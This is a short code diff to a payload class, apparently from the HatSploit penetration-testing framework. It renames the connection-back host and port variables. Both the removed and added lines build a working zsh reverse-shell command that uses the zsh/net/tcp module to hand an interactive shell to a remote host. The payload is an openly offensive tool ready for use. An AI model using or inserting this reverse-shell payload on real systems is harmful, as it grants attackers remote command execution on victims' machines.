@@ -24,8 +24,8 @@ class HatSploitPayload(Payload):
     }
 
     def run(self):
-        connback_host = self.handler['CBHOST']
-        connback_port = self.handler['CBPORT']
+        remote_host = self.handler['RHOST']
+        remote_port = self.handler['RPORT']
 
-        payload = f"zsh -c 'zmodload zsh/net/tcp && ztcp {connback_host} {connback_port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
+        payload = f"zsh -c 'zmodload zsh/net/tcp && ztcp {remote_host} {remote_port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
         return payload
